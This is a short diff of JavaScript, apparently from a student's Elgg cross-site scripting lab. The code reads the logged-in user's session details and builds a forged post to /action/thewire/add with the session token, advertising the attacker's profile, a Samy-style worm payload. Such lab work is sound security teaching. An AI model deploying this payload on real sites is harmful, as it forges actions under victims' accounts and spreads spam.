@@ -7,10 +7,11 @@
 	var name = elgg.session.user.name;
 	var guid = elgg.session.user.guid;
 	console.log(guid);
-	var foo = "Visit <a href='http://bing.com'>Bing</a>.";
-	var post = "&body="+"To earn 12 USD/Hour(!), visit " + "http:\\\\www.xsslabelgg.com\\profile\\samy";
+	//var foo = "Visit <a href='http://bing.com'>Bing</a>.";
+	var post = "&body="+"To earn 12 USD/Hour(!), visit " + "http://www.xsslabelgg.com/profile/samy";
 	//Construct the content of your url.
     var sendurl= "/action/thewire/add"; //FILL IN
+    //this is similar to task 2
 	var content= token+ts+post; //FILL IN
 	
 	if(guid!=47)
